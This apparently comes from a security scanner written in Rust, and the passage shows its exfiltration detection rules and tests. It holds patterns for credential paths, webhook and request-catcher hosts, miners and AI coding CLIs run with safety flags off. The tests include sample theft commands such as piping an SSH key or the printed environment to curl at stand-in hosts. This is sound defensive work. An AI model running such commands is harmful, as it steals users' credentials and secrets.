//! Exfiltration rules: webhooks, credential paths, environment dumps, miners, AI CLI abuse (Task 4).

use std::sync::OnceLock;

use regex::Regex;

use super::hidden::{
    Hits, Rule, cached, in_comment, is_script, is_test_path, lines_around, report,
};
use crate::scan::ReachedTest;
use crate::{FileCtx, FileKind, Finding, Group, Lang, Severity};

// The patterns spell their dots as `[.]` and break up their own keywords, so this file does not
// match the rules it holds when the repo scans itself.

/// Chat services bots post to by design: a webhook or a bot URL is MEDIUM unless more shows it
/// carries secrets.
fn chat_hosts() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"(?i)\bdiscord(?:app)?[.]com/api/webhooks/|\bapi[.]telegram[.]org/bot",
    )
}

/// Services whose only use is to catch requests from anywhere.
fn catcher_hosts() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"(?i)\bwebhook[.]site\b|\btransfer[.]sh\b|\bngrok(?:-free)?[.](?:io|app)\b|[.]oast[.](?:fun|me|pro|site)\b|\binteract[.]sh\b|\bpipedream[.]net\b",
    )
}

fn credential_paths() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"[.]ssh/id_|[.]aws/credentials|[.]npmrc|[.]config/gcloud|Login Data|Local State|nkbihfbeogaeaoehlefnkodbefgpgknn|Exodus",
    )
}

fn env_dumps() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"JSON[.]stringify\(\s*process[.]env|dict\(os[.]environ\)",
    )
}

/// A read of the whole environment or of a well-known token: what a webhook post may carry.
fn secret_reads() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"JSON[.]stringify\(\s*process[.]env|Object[.](?:entries|keys|values)\(\s*process[.]env\b|dict\(os[.]environ\)|os[.]environ[.](?:copy|items|keys|values)\(|\bprintenv\b|\bENV[.]to_h\b|\b(?:GITHUB_TOKEN|GH_TOKEN|NPM_TOKEN|NODE_AUTH_TOKEN|PYPI_TOKEN|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|ANTHROPIC_API_KEY|OPENAI_API_KEY|GITLAB_TOKEN|CI_JOB_TOKEN)\b|[.]git-credentials",
    )
}

fn network_words() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(&CELL, r"\b(?:fetch|requests|https?)\b")
}

/// A call that sends data off the machine.
fn send_calls() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"\bfetch\s*\(|\baxios\b|\bpost\s*\(|\brequest\s*\(|\bcurl\b|\bwget\b|\brequests[.]|\burlopen\b|\bXMLHttpRequest\b|\bsendBeacon\b|\bscp\b|\b(?:nc|ncat)\b|\bhttps?[.](?:request|get)\b",
    )
}

/// A call that writes a file.
fn write_calls() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r#"\b(?:writeFile(?:Sync)?|appendFile(?:Sync)?|createWriteStream|write_text|write_bytes|file_put_contents)\b|\bopen\s*\([^)\n]*['"][wa]b?['"]"#,
    )
}

/// A call that reads a file, or a command that does.
fn read_calls() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"\b(?:readFile\w*|readSync|readlines?|read_text|read_bytes|createReadStream|file_get_contents|open|cat|cp|copyFile\w*|ReadFile)\b|\bfs[.]read\w*|\bFile[.]read\w*|Get-Content",
    )
}

/// The `type` command of a batch file, which prints a file.
fn type_command() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(&CELL, r"(?i)\btype\s+\S")
}

/// A shell input redirection that ends the text before a path: `< path`, `$(<path)`.
fn redirect_before() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(&CELL, r#"(?:^|[^<>])<\s*["']?[^\s"'<>]*$"#)
}

fn miners() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(&CELL, r"(?i)stratum[+]tcp://|xmr[i]g|--donate-leve[l]")
}

fn ai_cli_names() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"(?i)\b(?:claude|gemini|codex|cursor-agent)\b|\bq chat\b",
    )
}

fn ai_cli_flags() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"--dangerously-skip-permissions|--yolo\b|--trust-all-tools",
    )
}

/// What stands in front of a flag that is only being compared with: `== '`, `in ('`, `startswith('`.
fn comparison_before() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r#"(?:[=!]==?|\bin\b\s*[(\[{]?|startswith\(|endswith\(|includes\(|\.get\()\s*['"`]?$"#,
    )
}

fn spawn_apis() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"\b(?:spawn|spawnSync|exec|execSync|execFile|execFileSync|system)\s*\(|child_process|\bsubprocess\b|\bPopen\b|\bos\.(?:system|popen)\b|\bshell_exec\b|\bproc_open\b",
    )
}

/// How far from one another two parts of one flow may be, in lines.
const NEAR: usize = 10;
/// How far from a credential path its read call may be, in lines.
const READ_NEAR: usize = 3;
/// How far before a flag its CLI name may be, in bytes: one command.
const COMMAND_BYTES: usize = 300;

/// The `n` bytes before `at`, from a character boundary.
fn tail(text: &str, at: usize, n: usize) -> &str {
    let mut start = at.saturating_sub(n);
    while !text.is_char_boundary(start) {
        start += 1;
    }
    &text[start..at]
}

fn hits_of(re: &Regex, text: &str) -> Hits {
    let mut hits = Hits::default();
    for m in re.find_iter(text) {
        hits.add(m.start());
    }
    hits
}

/// Hits of `re`, and whether any one of them passes `strong`. When one does, the first hit shown
/// is the first strong one.
fn graded_hits(re: &Regex, text: &str, strong: impl Fn(usize) -> bool) -> (Hits, bool) {
    let mut hits = Hits::default();
    let mut first_strong = None;
    for m in re.find_iter(text) {
        hits.add(m.start());
        if first_strong.is_none() && strong(m.start()) {
            first_strong = Some(m.start());
        }
    }
    if first_strong.is_some() {
        hits.first = first_strong;
    }
    (hits, first_strong.is_some())
}

fn send_near(text: &str, at: usize) -> bool {
    send_calls().is_match(lines_around(text, at, NEAR, NEAR))
}

/// Said in the `why` of a MEDIUM finding that the raise for reached files lifts to HIGH: the
/// finding has the shape of a theft (a read and a send, an environment dump and a send, a post to a
/// chat service) and is MEDIUM only because nothing is known to run the file.
const RAISE_NOTE: &str = " It is MEDIUM because nothing is known to run this file; it is HIGH when an install script, a build step or an editor task runs it.";

fn why_with_note(why: &str, note: bool) -> String {
    if note {
        format!("{why}{RAISE_NOTE}")
    } else {
        why.to_string()
    }
}

/// Whether the credential path at `at` is read: a read call within 3 lines, or an input
/// redirection right before it.
fn is_read(text: &str, at: usize, lang: Lang) -> bool {
    let window = lines_around(text, at, READ_NEAR, READ_NEAR);
    let line_start = text[..at].rfind('\n').map_or(0, |i| i + 1);
    read_calls().is_match(window)
        || (lang == Lang::Bat && type_command().is_match(window))
        || redirect_before().is_match(&text[line_start..at])
}

/// Whether the path at `at` is part of a container bind or mount spec (`-v host:/root/.npmrc`,
/// `--mount type=bind,source=x,target=/root/.npmrc`): a path inside a container, not a read of
/// the host credential.
fn is_bind_spec(text: &str, at: usize) -> bool {
    let delimiter = |c: char| c.is_whitespace() || matches!(c, '\'' | '"' | '`' | ',');
    let start = text[..at].rfind(delimiter).map_or(0, |i| {
        i + text[i..].chars().next().map_or(1, char::len_utf8)
    });
    let end = text[at..].find(delimiter).map_or(text.len(), |i| at + i);
    let token = &text[start..end];
    (token.contains(":/") && !token.contains("://"))
        || ["target=", "dst=", "destination=", "source=", "src="]
            .iter()
            .any(|key| token.contains(key))
}

fn emit(f: &FileCtx, text: &str, hits: &Hits, rule: &Rule, out: &mut Vec<Finding>) {
    out.extend(report(f, text, hits, rule));
}

const WEBHOOK_WHY: &str = "The code names a service that takes in data from anywhere: a chat webhook or a request catcher. Stolen data leaves this way.";
const WEBHOOK_ACTION: &str = "Find out what is sent there, and do not run the code until you know.";

fn webhook(f: &FileCtx, text: &str, test: bool, out: &mut Vec<Finding>) {
    let catchers = hits_of(catcher_hosts(), text);
    // A chat URL is HIGH when it is sent to and the file also reads the environment or a token.
    let (chat, sent) = graded_hits(chat_hosts(), text, |at| send_near(text, at));
    let reads_secrets = secret_reads().is_match(text) || credential_paths().is_match(text);
    let high = catchers.first.is_some() || (sent && !test && reads_secrets);
    let first = match (catchers.first, chat.first) {
        (Some(a), Some(b)) => Some(a.min(b)),
        (a, b) => a.or(b),
    };
    let hits = Hits {
        first,
        count: catchers.count + chat.count,
    };
    let why = why_with_note(WEBHOOK_WHY, !high);
    let rule = Rule {
        group: Group::Exfil,
        id: "exfil.webhook",
        severity: if high {
            Severity::High
        } else {
            Severity::Medium
        },
        why: &why,
        action: WEBHOOK_ACTION,
    };
    emit(f, text, &hits, &rule, out);
}

/// Raises the MEDIUM `exfil.*` findings of a file that an auto-run surface reaches to HIGH, when
/// the finding carries `RAISE_NOTE`: it has the shape of a theft (a read and a send, an
/// environment dump and a send, a post to a chat service) and is MEDIUM only for a test path or the
/// chat-webhook ruling. Those exist for files that only sit in the tree: a script that runs on
/// install and posts to a chat service, or reads `.npmrc` from a file under `test/`, is not a bot or
/// a fixture. A mention in a comment, a bind spec or a dump with no flow is not lifted. The
/// orchestrator calls this once with the set of reached paths and the findings it collected;
/// other groups are not touched.
pub(crate) fn raise_reached(findings: &mut [Finding], reached: &ReachedTest<'_>) {
    for finding in findings.iter_mut().filter(|x| {
        x.group == Group::Exfil && x.severity == Severity::Medium && x.why.contains(RAISE_NOTE)
    }) {
        if reached(&finding.path) {
            finding.severity = Severity::High;
        }
    }
}

fn cred_path(f: &FileCtx, lang: Lang, text: &str, test: bool, out: &mut Vec<Finding>) {
    // The shape of a theft: the path in code (not a comment, not a container bind or mount spec),
    // the argument of a read, with a send within 10 lines. A doc comment, a help string or a
    // `docker run -v` mount of `.npmrc` is not one. In a test path the shape is MEDIUM, and a run
    // of the file raises it.
    let (hits, theft) = graded_hits(credential_paths(), text, |at| {
        !in_comment(text, at, lang)
            && !is_bind_spec(text, at)
            && is_read(text, at, lang)
            && send_near(text, at)
    });
    let high = theft && !test;
    let why = why_with_note(
        "The script names a place where credentials live (SSH keys, cloud or registry tokens, browser or wallet data). With a read and a send close by, this is how they leave.",
        theft && test,
    );
    let rule = Rule {
        group: Group::Exfil,
        id: "exfil.cred-path",
        severity: if high {
            Severity::High
        } else {
            Severity::Medium
        },
        why: &why,
        action: "Read what the script does with the file before you run it.",
    };
    emit(f, text, &hits, &rule, out);
}

fn env_dump(f: &FileCtx, lang: Lang, text: &str, test: bool, out: &mut Vec<Finding>) {
    // HIGH when the dump flows to a send or a file write within 10 lines. A dump in a file that
    // talks to the network elsewhere, or in a test, is MEDIUM; a dump with no network is clean.
    let (hits, flow) = graded_hits(env_dumps(), text, |at| {
        let near = lines_around(text, at, NEAR, NEAR);
        !in_comment(text, at, lang) && (send_calls().is_match(near) || write_calls().is_match(near))
    });
    let severity = if flow && !test {
        Severity::High
    } else if flow || network_words().is_match(text) || send_calls().is_match(text) {
        Severity::Medium
    } else {
        return;
    };
    let why = why_with_note(
        "The script reads the whole environment, where tokens and keys are. With a send or a file write close by, the environment leaves the process.",
        flow && test,
    );
    let rule = Rule {
        group: Group::Exfil,
        id: "exfil.env-dump",
        severity,
        why: &why,
        action: "Do not run it: read where the environment goes first.",
    };
    emit(f, text, &hits, &rule, out);
}

fn ai_cli_abuse(f: &FileCtx, text: &str, out: &mut Vec<Finding>) {
    if !spawn_apis().is_match(text) {
        return;
    }
    // The CLI name and the flag must be one command: the name within 300 bytes before the flag,
    // and the flag not just compared with.
    let mut hits = Hits::default();
    for m in ai_cli_flags().find_iter(text) {
        let command = tail(text, m.start(), COMMAND_BYTES);
        let compared = comparison_before().is_match(tail(text, m.start(), 24));
        if ai_cli_names().is_match(command) && !compared {
            hits.add(m.start());
        }
    }
    let rule = Rule {
        group: Group::Exfil,
        id: "exfil.ai-cli-abuse",
        severity: Severity::High,
        why: "The script starts an AI coding CLI with its safety checks off, so the CLI reads files and runs commands for whoever wrote the prompt.",
        action: "Do not run it: read the prompt it passes first.",
    };
    emit(f, text, &hits, &rule, out);
}

pub(crate) fn check(f: &FileCtx, out: &mut Vec<Finding>) {
    let (FileKind::Code(lang), Some(text)) = (f.kind, f.text) else {
        return;
    };
    let test = is_test_path(f.path);

    // All code.
    webhook(f, text, test, out);
    emit(
        f,
        text,
        &hits_of(miners(), text),
        &Rule {
            group: Group::Exfil,
            id: "exfil.miner",
            severity: Severity::High,
            why: "The code refers to a cryptocurrency miner.",
            action: "Do not run it: a miner uses your machine's power for someone else.",
        },
        out,
    );
    if !is_script(lang) {
        return;
    }

    // The script set.
    cred_path(f, lang, text, test, out);
    env_dump(f, lang, text, test, out);
    ai_cli_abuse(f, text, out);
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{FileKind, Group, Lang, Severity};

    fn run(path: &str, kind: FileKind, text: &str) -> Vec<Finding> {
        let f = FileCtx {
            path,
            bytes: text.as_bytes(),
            text: Some(text),
            kind,
            truncated: false,
        };
        let mut out = Vec::new();
        check(&f, &mut out);
        out
    }

    fn code(lang: Lang, text: &str) -> Vec<Finding> {
        run("src/a.file", FileKind::Code(lang), text)
    }

    fn rules(v: &[Finding]) -> Vec<&str> {
        v.iter().map(|f| f.rule.as_str()).collect()
    }

    fn one<'a>(v: &'a [Finding], rule: &str) -> &'a Finding {
        let hits: Vec<&Finding> = v.iter().filter(|f| f.rule == rule).collect();
        assert_eq!(hits.len(), 1, "{rule} in {:?}", rules(v));
        hits[0]
    }

    // Every indicator is split so this file stays clean when the repo scans itself.
    const DISCORD: &str = concat!("https://disc", "ord.com/api/webh", "ooks/1/x");
    const DISCORDAPP: &str = concat!("https://disc", "ordapp.com/api/webh", "ooks/1/x");
    const TELEGRAM: &str = concat!("https://api.tele", "gram.org/bot123:abc/sendMessage");
    const WEBHOOK_SITE: &str = concat!("https://webh", "ook.site/abc");
    const TRANSFER: &str = concat!("https://trans", "fer.sh/up");
    const NGROK: &str = concat!("https://abc.ngr", "ok.io/x");
    const NGROK_FREE: &str = concat!("https://abc.ngr", "ok-free.app/x");
    const OAST: &str = concat!("abc.oa", "st.fun");
    const INTERACT: &str = concat!("abc.inter", "act.sh");
    const PIPEDREAM: &str = concat!("https://eo1.pipe", "dream.net/x");
    const SSH_KEY: &str = concat!("~/.s", "sh/id_rsa");
    const AWS_CREDS: &str = concat!("~/.a", "ws/credentials");
    const NPMRC: &str = concat!("~/.np", "mrc");
    const GCLOUD: &str = concat!("~/.config/", "gcloud");
    const CHROME_LOGIN: &str = concat!("Login ", "Data");
    const CHROME_STATE: &str = concat!("Local ", "State");
    const METAMASK: &str = concat!("nkbihfbeog", "aeaoehlefnkodbefgpgknn");
    const EXODUS: &str = concat!("Exo", "dus");
    const STRATUM: &str = concat!("stratum+", "tcp://pool.example.invalid:3333");
    const MINER_BIN: &str = concat!("./xm", "rig -o pool");
    const DONATE: &str = concat!("--donate-", "level=1");
    const SKIP_PERMS: &str = concat!("--dangerously-", "skip-permissions");

    #[test]
    fn request_catcher_hosts_are_high_in_any_code() {
        let all = [
            WEBHOOK_SITE,
            TRANSFER,
            NGROK,
            NGROK_FREE,
            OAST,
            INTERACT,
            PIPEDREAM,
        ];
        for host in all {
            let t = format!("x = 1\nfetch(\"{host}\", {{ method: 'POST' }})\n");
            for lang in [Lang::Js, Lang::Rs, Lang::Go] {
                let v = code(lang, &t);
                let f = one(&v, "exfil.webhook");
                assert_eq!(
                    (f.severity, f.group, f.line, f.count),
                    (Severity::High, Group::Exfil, 2, 1),
                    "{host}"
                );
                assert!(f.seen.contains(host), "{:?}", f.seen);
            }
        }
    }

    #[test]
    fn a_webhook_url_in_a_doc_or_a_look_alike_name_is_clean() {
        let t = format!("post to {DISCORD}\n");
        assert!(run("README.md", FileKind::Doc, &t).is_empty());
        assert!(run("notes.txt", FileKind::Data, &t).is_empty());
        assert!(code(Lang::Sh, "./file_transfer.sh --all\nmy-webhook-sites.txt\n").is_empty());
        assert!(code(Lang::Js, "const ngrokfree = 1; // not a host\n").is_empty());
    }

    #[test]
    fn a_credential_path_is_medium_and_high_with_network() {
        for path in [
            SSH_KEY,
            AWS_CREDS,
            NPMRC,
            GCLOUD,
            CHROME_LOGIN,
            CHROME_STATE,
            METAMASK,
            EXODUS,
        ] {
            let t = format!("const p = '{path}';\nfs.readFileSync(p);\n");
            let v = code(Lang::Js, &t);
            let f = one(&v, "exfil.cred-path");
            assert_eq!(
                (f.severity, f.group, f.line),
                (Severity::Medium, Group::Exfil, 1),
                "{path}"
            );
            let t = format!(
                "{t}fetch('https://example.invalid/up', {{ body: fs.readFileSync(p) }});\n"
            );
            assert_eq!(
                one(&code(Lang::Js, &t), "exfil.cred-path").severity,
                Severity::High,
                "{path}"
            );
        }
        let t = format!("cat {SSH_KEY} | curl -d @- https://example.invalid/\n");
        assert_eq!(
            one(&code(Lang::Sh, &t), "exfil.cred-path").severity,
            Severity::High
        );
        let t = format!("x = open('{AWS_CREDS}')\nos.system('nc 203.0.113.9 80')\n");
        assert_eq!(
            one(&code(Lang::Py, &t), "exfil.cred-path").severity,
            Severity::High
        );
    }

    #[test]
    fn a_credential_path_in_text_that_is_not_code_is_medium() {
        let send = "fetch('https://example.invalid/up');\n";
        // vscode shape: a doc comment, a comment quoting a prompt, a help string.
        let comment = format!("/**\n * Reads {NPMRC} and sends it.\n */\n{send}");
        let v = code(Lang::Js, &comment);
        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::Medium);
        let line = format!("// copy {SSH_KEY} with cat\n{send}");
        assert_eq!(
            one(&code(Lang::Js, &line), "exfil.cred-path").severity,
            Severity::Medium
        );
        let trailing = format!("read(x); // see {SSH_KEY}\n{send}");
        assert_eq!(
            one(&code(Lang::Js, &trailing), "exfil.cred-path").severity,
            Severity::Medium
        );
        let hash = format!("# cat {AWS_CREDS}\nrequests.post(u)\n");
        assert_eq!(
            one(&code(Lang::Py, &hash), "exfil.cred-path").severity,
            Severity::Medium
        );
        let help = format!("const help = 'Set the token in {NPMRC} first';\n{send}");
        assert_eq!(
            one(&code(Lang::Js, &help), "exfil.cred-path").severity,
            Severity::Medium
        );
        // A read call far from the path is not a read of it.
        let far = format!(
            "const p = '{SSH_KEY}';\n{}fs.readFileSync(p);\n{send}",
            "x();\n".repeat(10)
        );
        assert_eq!(
            one(&code(Lang::Js, &far), "exfil.cred-path").severity,
            Severity::Medium
        );
    }

    #[test]
    fn a_credential_path_read_and_sent_in_a_test_folder_is_medium() {
        let t = format!("const k = fs.readFileSync('{SSH_KEY}');\nfetch(u, {{ body: k }});\n");
        for path in [
            "src/test/a.js",
            "pkg/__tests__/a.js",
            "src/a.test.ts",
            "spec/a.js",
            "src/fixtures/a.js",
            "pkg/a.spec.js",
        ] {
            let v = run(path, FileKind::Code(Lang::Js), &t);
            assert_eq!(
                one(&v, "exfil.cred-path").severity,
                Severity::Medium,
                "{path}"
            );
        }
        let v = run("src/a.js", FileKind::Code(Lang::Js), &t);
        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::High);
    }

    #[test]
    fn other_languages_and_docs_are_not_checked_for_credential_paths() {
        let t = format!("let p = \"{SSH_KEY}\";\n");
        assert!(code(Lang::Rs, &t).is_empty());
        assert!(run("a.md", FileKind::Doc, &t).is_empty());
        assert!(code(Lang::Js, "const a = 'nothing to see';\n").is_empty());
    }

    #[test]
    fn dumping_the_environment_to_the_network_is_high() {
        let js = "fetch('https://example.invalid/', { body: JSON.stringify(process.env) });\n";
        let v = code(Lang::Js, js);
        let f = one(&v, "exfil.env-dump");
        assert_eq!(
            (f.severity, f.group, f.line),
            (Severity::High, Group::Exfil, 1)
        );
        let spaced =
            "const e = JSON.stringify( process.env );\nconst r = await fetch(u, { body: e });\n";
        assert_eq!(
            one(&code(Lang::Js, spaced), "exfil.env-dump").severity,
            Severity::High
        );
        let py = "import requests\nrequests.post(u, json=dict(os.environ))\n";
        assert_eq!(
            one(&code(Lang::Py, py), "exfil.env-dump").severity,
            Severity::High
        );
        let py = "import http.client\nbody = dict(os.environ)\nconn.request('POST', '/', body)\n";
        assert_eq!(
            one(&code(Lang::Py, py), "exfil.env-dump").severity,
            Severity::High
        );
        // A write to a file within 10 lines is a flow out too.
        let js =
            "const e = JSON.stringify(process.env);\nfs.writeFileSync('/tmp/e', e);\nfetch(u);\n";
        assert_eq!(
            one(&code(Lang::Js, js), "exfil.env-dump").severity,
            Severity::High
        );
    }

    #[test]
    fn an_environment_dump_that_goes_nowhere_near_a_send_is_medium() {
        // The file talks to the network, but 40 lines from the dump.
        let far = format!(
            "const e = JSON.stringify(process.env);\n{}fetch(u);\n",
            "// filler\n".repeat(40)
        );
        let v = code(Lang::Js, &far);
        assert_eq!(one(&v, "exfil.env-dump").severity, Severity::Medium);
        // vscode shape: a test compares the dump with another, and there is a URL in the file.
        let test = "const url = 'https://example.invalid';\nassert.strictEqual(JSON.stringify(process.env), JSON.stringify(environment));\n";
        let v = run(
            "src/foo/test/browser/handler.test.ts",
            FileKind::Code(Lang::Js),
            test,
        );
        assert_eq!(one(&v, "exfil.env-dump").severity, Severity::Medium);
        // Even with a send next to it, a test path stays MEDIUM.
        let v = run(
            "src/foo/test/browser/handler.test.ts",
            FileKind::Code(Lang::Js),
            "fetch(u, { body: JSON.stringify(process.env) });\n",
        );
        assert_eq!(one(&v, "exfil.env-dump").severity, Severity::Medium);
    }

    #[test]
    fn an_environment_dump_with_no_network_or_one_variable_is_clean() {
        assert!(code(Lang::Js, "console.log(JSON.stringify(process.env));\n").is_empty());
        assert!(code(Lang::Py, "print(dict(os.environ))\n").is_empty());
        assert!(code(Lang::Js, "fetch(u, { body: process.env.HOME });\n").is_empty());
        assert!(code(Lang::Rs, "JSON.stringify(process.env); fetch(u);").is_empty());
    }

    #[test]
    fn a_miner_marker_is_high_in_any_code() {
        for marker in [STRATUM, MINER_BIN, DONATE] {
            for lang in [Lang::Sh, Lang::Go, Lang::Js] {
                let t = format!("run {marker}\n");
                let v = code(lang, &t);
                let f = one(&v, "exfil.miner");
                assert_eq!(
                    (f.severity, f.group, f.line),
                    (Severity::High, Group::Exfil, 1),
                    "{marker}"
                );
            }
        }
        assert!(run("README.md", FileKind::Doc, STRATUM).is_empty());
        assert!(code(Lang::Js, "const pool = 'pool.example.invalid';\n").is_empty());
    }

    #[test]
    fn an_ai_cli_with_a_safety_flag_and_a_spawn_is_high() {
        let js = format!(
            "const {{ spawn }} = require('child_process');\nspawn('claude', ['{SKIP_PERMS}', '-p', prompt]);\n"
        );
        let v = code(Lang::Js, &js);
        let f = one(&v, "exfil.ai-cli-abuse");
        assert_eq!((f.severity, f.group), (Severity::High, Group::Exfil));
        let py = "import subprocess\nsubprocess.run(['gemini', '--yolo', '-p', p])\n";
        assert_eq!(
            one(&code(Lang::Py, py), "exfil.ai-cli-abuse").severity,
            Severity::High
        );
        let py = "os.system('q chat --trust-all-tools ' + p)\n";
        assert_eq!(
            one(&code(Lang::Py, py), "exfil.ai-cli-abuse").severity,
            Severity::High
        );
        let js = "execSync(`codex --yolo ${p}`);\n";
        assert_eq!(
            one(&code(Lang::Js, js), "exfil.ai-cli-abuse").severity,
            Severity::High
        );
    }

    #[test]
    fn the_new_cli_name_counts() {
        let js = format!("execSync('cursor-agent {SKIP_PERMS} ' + p);\n");
        assert_eq!(
            one(&code(Lang::Js, &js), "exfil.ai-cli-abuse").severity,
            Severity::High
        );
    }

    #[test]
    fn a_script_that_only_compares_an_argument_to_the_flag_is_clean() {
        // claude-code shape: a workflow checker that looks for the flag.
        let py = format!(
            "import subprocess\n# runs claude steps\nfor arg in args:\n    if arg == \"{SKIP_PERMS}\":\n        report(arg)\n    if arg in ('{SKIP_PERMS}', 'x'):\n        report(arg)\n    if arg.startswith('{SKIP_PERMS}'):\n        pass\nsubprocess.run(['git', 'status'])\n"
        );
        assert!(code(Lang::Py, &py).is_empty());
        let js = format!(
            "const {{ spawn }} = require('child_process');\nif (a === '{SKIP_PERMS}') claude();\n"
        );
        assert!(code(Lang::Js, &js).is_empty());
        // A name far from the flag is not one command.
        let far = format!(
            "spawn('claude', ['-p']);\n{}spawn('ls', ['{SKIP_PERMS}']);\n",
            "// filler\n".repeat(60)
        );
        assert!(code(Lang::Js, &far).is_empty());
    }

    #[test]
    fn an_ai_cli_without_all_three_parts_is_clean() {
        // A shell script that starts the CLI has the name and the flag but no spawn API.
        let sh = format!("timeout 300 claude -p \"$PROMPT\" {SKIP_PERMS}\n");
        assert!(code(Lang::Sh, &sh).is_empty());
        assert!(code(Lang::Js, "spawn('claude', ['-p', prompt]);\n").is_empty());
        assert!(code(Lang::Js, "spawn('ls', ['--yolo']);\n").is_empty());
        assert!(code(Lang::Js, &format!("const doc = 'claude {SKIP_PERMS}';\n")).is_empty());
        assert!(code(Lang::Rs, &format!("spawn('claude', '{SKIP_PERMS}');")).is_empty());
    }

    #[test]
    fn one_finding_counts_every_hit_in_the_file() {
        let t = format!("a('{DISCORD}');\nb('{TELEGRAM}');\n");
        let v = code(Lang::Js, &t);
        let f = one(&v, "exfil.webhook");
        assert_eq!((f.line, f.count), (1, 2));
    }

    #[test]
    fn a_chat_webhook_alone_is_medium() {
        // Bot repos post to Discord and Telegram by design.
        for host in [DISCORD, DISCORDAPP, TELEGRAM] {
            let t = format!("x = 1\nfetch(\"{host}\", {{ method: 'POST' }})\n");
            for lang in [Lang::Js, Lang::Rs, Lang::Py] {
                let v = code(lang, &t);
                let f = one(&v, "exfil.webhook");
                assert_eq!(
                    (f.severity, f.group, f.line, f.count),
                    (Severity::Medium, Group::Exfil, 2, 1),
                    "{host}"
                );
            }
        }
        // A bot that reads only its own token and one named setting is still a bot.
        let bot = format!("const t = process.env.BOT_TOKEN;\nfetch('{TELEGRAM}' + t);\n");
        assert_eq!(
            one(&code(Lang::Js, &bot), "exfil.webhook").severity,
            Severity::Medium
        );
    }

    #[test]
    fn a_chat_webhook_with_a_secret_read_is_high() {
        let reads = [
            "const all = JSON.stringify(process.env);",
            "const all = Object.entries(process.env);",
            "body = dict(os.environ)",
            "for k, v in os.environ.items(): pass",
            "const t = process.env.GITHUB_TOKEN;",
            "key = os.environ['AWS_SECRET_ACCESS_KEY']",
            "const k = fs.readFileSync(os.homedir() + '/.ssh/id_rsa');",
            "cat ~/.git-credentials",
        ];
        for read in reads {
            let t = format!("{read}\nfetch('{DISCORD}', {{ body: x }});\n");
            let v = code(Lang::Js, &t);
            let f = one(&v, "exfil.webhook");
            assert_eq!(f.severity, Severity::High, "{read}");
            assert_eq!(f.line, 2, "{read}");
        }
        let t = format!("printenv | curl -d @- {TELEGRAM}\n");
        assert_eq!(
            one(&code(Lang::Sh, &t), "exfil.webhook").severity,
            Severity::High
        );
    }

    #[test]
    fn a_chat_webhook_needs_a_send_near_it_to_be_high() {
        let token = "const t = process.env.GITHUB_TOKEN;\n";
        // No send call within 10 lines of the URL.
        let far = format!(
            "{token}const u = '{DISCORD}';\n{}fetch(u);\n",
            "// filler\n".repeat(40)
        );
        assert_eq!(
            one(&code(Lang::Js, &far), "exfil.webhook").severity,
            Severity::Medium
        );
        // vscode shape: a fake URL in a test of a secret filter, with a secret read near it.
        let spec = format!(
            "const t = process.env.GITHUB_TOKEN;\nfetch('{DISCORD}');\nexpect(filter(x)).toBe(y);\n"
        );
        let v = run(
            "src/ext/test/secretFilter.spec.ts",
            FileKind::Code(Lang::Js),
            &spec,
        );
        assert_eq!(one(&v, "exfil.webhook").severity, Severity::Medium);
        let v = run("src/ext/secretFilter.ts", FileKind::Code(Lang::Js), &spec);
        assert_eq!(one(&v, "exfil.webhook").severity, Severity::High);
        // A fake token on the URL line is not a secret read.
        let fake = format!("const x = '{DISCORD}/ABCDEFtoken';\n");
        assert_eq!(
            one(&code(Lang::Js, &fake), "exfil.webhook").severity,
            Severity::Medium
        );
    }

    #[test]
    fn a_chat_webhook_and_a_request_catcher_in_one_file_is_high() {
        let t = format!("a('{DISCORD}');\nb('{WEBHOOK_SITE}');\n");
        let v = code(Lang::Js, &t);
        let f = one(&v, "exfil.webhook");
        assert_eq!((f.severity, f.line, f.count), (Severity::High, 1, 2));
    }

    #[test]
    fn a_reached_chat_webhook_is_raised_to_high() {
        let t = format!("fetch('{DISCORD}');\n");
        let mut v = code(Lang::Js, &t);
        assert_eq!(one(&v, "exfil.webhook").severity, Severity::Medium);
        raise_reached(&mut v, &|path| path == "src/a.file");
        assert_eq!(one(&v, "exfil.webhook").severity, Severity::High);
        // A file no auto-run surface reaches stays MEDIUM.
        let mut v = code(Lang::Js, &t);
        raise_reached(&mut v, &|path| path == "other.js");
        assert_eq!(one(&v, "exfil.webhook").severity, Severity::Medium);
    }

    #[test]
    fn a_reached_file_loses_the_test_path_cap() {
        // A test-folder script that reads and sends a credential is MEDIUM on its own and HIGH
        // when something runs it; so is an environment dump that flows to a send.
        let t = format!(
            "const k = fs.readFileSync('{NPMRC}');\nfetch(u, {{ body: k }});\nconst e = JSON.stringify(process.env);\nfetch(u, {{ body: e }});\n"
        );
        let mut v = run("test/x.js", FileKind::Code(Lang::Js), &t);
        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::Medium);
        assert_eq!(one(&v, "exfil.env-dump").severity, Severity::Medium);
        raise_reached(&mut v, &|path| path == "test/x.js");
        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::High);
        assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High);
    }

    #[test]
